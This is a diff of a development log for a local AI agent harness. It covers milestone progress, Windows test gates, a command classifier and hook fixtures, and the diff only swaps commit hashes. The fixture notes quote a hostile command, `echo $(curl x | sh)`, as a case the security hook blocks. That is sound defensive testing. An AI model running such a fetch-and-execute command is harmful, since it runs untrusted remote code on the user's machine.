@@ -60,12 +60,12 @@
 
 Branch `m2-tools` in `D:\src\harnessforkush`; plan in [milestones/m2-tools.md](milestones/m2-tools.md).
 Windows gate green after each step.
-- Step 0 (`e8f2875`): `mcp/tools.rs` became `mcp/tools/mod.rs`; new tool groups are child modules; git test
+- Step 0 (`bcb39d2`): `mcp/tools.rs` became `mcp/tools/mod.rs`; new tool groups are child modules; git test
   helpers in `tools/test_support.rs`.
-- Step 1 (`e8f2875`): `git_history` (follows renames for a file) and `git_log_range` (commits, changed files,
+- Step 1 (`bcb39d2`): `git_history` (follows renames for a file) and `git_log_range` (commits, changed files,
   totals). Revisions must be plain and resolve to a commit; `--end-of-options` before them. A harness tool
   given a secret path is now denied at the hook too.
-- Step 2 (`c1fd7ad`): steps have a `kind` (test, lint, typecheck, build, other; default test) and `targets`.
+- Step 2 (`6354204`): steps have a `kind` (test, lint, typecheck, build, other; default test) and `targets`.
   `run_tests`, `run_linter`, `run_typechecker` run steps of their kind; `run_tests` appends checked targets
   to steps with `targets = true`. V24 warns about targets on a non-test step.
 - Step 3: `harness_core::failures` parses pytest, unittest, Python tracebacks, cargo test, rustc, gtest,
@@ -78,7 +78,7 @@ artifacts, adapters, the end-to-end run, and the `m2` tag.
 
 ## 2026-10-22 (evening): M1 end-to-end on Windows, all exit criteria met
 
-End-to-end on native Windows with the current build (`4a5548f`), Qwen3.5-9B on the RTX 4060, OpenCode 1.19.3,
+End-to-end on native Windows with the current build (`f8de89e`), Qwen3.5-9B on the RTX 4060, OpenCode 1.19.3,
 toy repo `D:\e2e\toy` regenerated with `agent init --force` (logs in `D:\e2e\logs\`):
 - `agent models serve main --detach`: healthy in 9.6 s. It found yesterday's PID record, saw that the process was
   gone, and cleared it (the new identity check on real data). Quick health: pass.
@@ -121,9 +121,9 @@ Where the work happens now (user decision: postpone WSL use; no subagents):
   reboot. `.wslconfig` now sets `memory=8GB` and `autoMemoryReclaim=dropCache` (backup `.wslconfig.bak-2026-10-22`).
   It applies after `wsl --shutdown`.
 
-Merged and verified on Windows (fmt, clippy and all 11 test suites pass, `cba15a2`):
-- Redaction fixes (`3a527e7`), path policy fixes including protected control files (`415af37`), MCP fixes
-  including the review follow-ups (`3393b77`), classifier fixes (`3b9b5db`).
+Merged and verified on Windows (fmt, clippy and all 11 test suites pass, `38b32bb`):
+- Redaction fixes (`3a0bcaf`), path policy fixes including protected control files (`23c4794`), MCP fixes
+  including the review follow-ups (`ee65204`), classifier fixes (`866c4cc`).
 - Windows found three problems that Linux tests missed. Lesson: run the Windows gate before merging.
   - A test used an 8.3 short temp path (`KUSHAG~1`) as its base; the guard correctly refuses it (test fixed).
   - **The classifier lexed Windows commands as `cmd`, but OpenCode 1.19.3 runs them in PowerShell.** Its
@@ -135,22 +135,22 @@ Merged and verified on Windows (fmt, clippy and all 11 test suites pass, `cba15a
 - `git config` writes were already EXECUTE_RISKY on the classifier branch (only `--get`, `--get-all` and
   `--list` are read-only), so the extra item needs no code; read forms such as `--get-regexp` stay blocked.
 
-Then fixed in the main session, each with tests, Windows gate green after each (`c7ff5fa`):
-- `a874fa4` repository-config trust (`config/trust.rs`); V22 reserved `extra_args` flags, also refused by the
+Then fixed in the main session, each with tests, Windows gate green after each (`7681bfa`):
+- `9aea571` repository-config trust (`config/trust.rs`); V22 reserved `extra_args` flags, also refused by the
   launcher; V23 timeout and retry bounds; 1 MiB SSE line cap. The toy repo's `safe_commands` entry was removed
   (`python -m unittest` is built in; a repository may no longer set safe prefixes).
-- `06ebc85` `models stop` checks the PID's executable before signalling (records hold `pid=` and `bin=`;
+- `c130c9f` `models stop` checks the PID's executable before signalling (records hold `pid=` and `bin=`;
   PIDs outside `1..=i32::MAX` refused); `--version` bounded at 5 s; `doctor` reports a busy or reserved port
   (M1 exit item 4).
-- `9cd0888` MCP timeout derived from the verification step timeouts; unanswered `permission` is `deny` (Rust and
+- `a9b38d5` MCP timeout derived from the verification step timeouts; unanswered `permission` is `deny` (Rust and
   shim; `tsc` not run, no Node on Windows).
-- `c7ff5fa` event-log top-level text redacted, with file read-back tests; `init` minors.
+- `7681bfa` event-log top-level text redacted, with file read-back tests; `init` minors.
 - Deferred to release 2: a process group for launched servers on Unix.
 - Found: a machine config written by a process the desktop app started lands in the app's MSIX
   storage (`%LOCALAPPDATA%\Packages\<app>_<id>\LocalCache\Roaming\local-agent\config.toml`), not in
   `%APPDATA%`. Programs started outside the app do not see it. Documented in cli-commands.md.
 
-Docs (`b9cf7b1`): module pages for security and MCP written; the other five pages, `security.md` and
+Docs (`9544dc5`): module pages for security and MCP written; the other five pages, `security.md` and
 `configuration.md` updated to the fixed behaviour.
 
 Still open for M1: rebuild `agent.exe` and rerun the Windows end-to-end runs (edit-and-test, secret read, MCP
@@ -159,9 +159,9 @@ matrix; merge into `main` and tag `m1`. The WSL repo must fetch from `D:` before
 
 ## M1 closing checklist (2026-10-22, morning)
 
-Done today: process-tree kill on verification timeout (`5e9b9fc`); server-side MCP redaction (`d0c3208`);
-safe prefixes only upgrade risky commands (`47b23d1`); doctor warns on a missing models directory (`fb3b3cf`);
-security residual risks updated (`b3a1ed4`). `doctor` with missing models and runtimes: runtimes block, models
+Done today: process-tree kill on verification timeout (`7e5dab3`); server-side MCP redaction (`9df0aa4`);
+safe prefixes only upgrade risky commands (`6291138`); doctor warns on a missing models directory (`55b7c94`);
+security residual risks updated (`6970752`). `doctor` with missing models and runtimes: runtimes block, models
 warn, no panic, exit 1 (checked by hand).
 
 Remaining to close M1, in order:
@@ -262,11 +262,11 @@ A running record. Newest entries first. Every "verified" line names the evidence
 
 ## 2026-10-21 (latest): fixtures, read fix, gates
 
-- Windows gate on the head with the fixture suite failed on one row: `curl https://example.com` was read as a drive or alternate-data-stream path, so the path guard blocked it with the wrong rule (WSL passed). Fixed in `be1bc02`: URL words are not paths; the network rule decides. Lesson: run the Windows gate after every fixture change; the two platforms take different code paths in the path check.
-- Windows gate re-run on `be1bc02`: every suite passes, including the 34-case hook fixture suite (1 test, all rows). 1 smoke test ignored by design. This is the native Windows result for release 1.
+- Windows gate on the head with the fixture suite failed on one row: `curl https://example.com` was read as a drive or alternate-data-stream path, so the path guard blocked it with the wrong rule (WSL passed). Fixed in `59f1d2f`: URL words are not paths; the network rule decides. Lesson: run the Windows gate after every fixture change; the two platforms take different code paths in the path check.
+- Windows gate re-run on `59f1d2f`: every suite passes, including the 34-case hook fixture suite (1 test, all rows). 1 smoke test ignored by design. This is the native Windows result for release 1.
 
-- Hook fixture suite merged (`2d794dc`, merge `89c3cac`): 34 black-box cases run the real `agent hook` binary, one test, all rows checked (`crates/harness-cli/tests/hook_fixtures.rs`). Passes on WSL.
-- Fixed from row 29: a `read` with no file path was allowed. It is now denied as malformed (`911a0cb`). Fail-closed.
+- Hook fixture suite merged (`db77421`, merge `cb445d8`): 34 black-box cases run the real `agent hook` binary, one test, all rows checked (`crates/harness-cli/tests/hook_fixtures.rs`). Passes on WSL.
+- Fixed from row 29: a `read` with no file path was allowed. It is now denied as malformed (`b45b851`). Fail-closed.
 - Two spec notes from the suite: row 21 (`echo $(curl x | sh)`) is blocked by the `allow_pattern_bypass` rule, not by the command classifier. Row 34 uses the `event` hook, because `session.idle` is an event type inside the payload, not a CLI name.
 - Gates after these commits: `cargo fmt --all` clean; `cargo clippy --workspace --all-targets -- -D warnings` clean; workspace tests pass on WSL. The Windows gate must be re-run on the latest head.
 - Still open: MCP output is not visible to the after-hook (security.md, residual risk 7); the 30-payload target is met by 34 cases; a full line-by-line review of the subagent code (D-3); `extra_safe` ordering; grandchild processes after a verification timeout.
@@ -315,7 +315,7 @@ Known gaps:
 
 ## 2026-10-21: merges and decisions
 
-- Merged the reviewed subagent branches: redactor (`6b64393`), launcher argv (`6b1211f`), config profiles and validation (`d7b2e47`), TypeScript shim (`94915f8`), providers (`346e336`), MCP server (`f17388d`), doctor/health/models (`e10ea61`), command classifier (`73b1a06`).
+- Merged the reviewed subagent branches: redactor (`35d68e9`), launcher argv (`9d741e6`), config profiles and validation (`98d55df`), TypeScript shim (`f482392`), providers (`89a17ee`), MCP server (`93dfc06`), doctor/health/models (`ce2e2f2`), command classifier (`5783509`).
 - Decision: release 1 is Windows-only; WSL moves to release 2 (ADR-0002 amendment).
 - Decision: classifier default on Windows is the `cmd` lexer (`ShellKind::host_default`).
 - Decision: profiles set an explicit load mode, one parallel slot and a 1 GiB prompt cache for the main model.
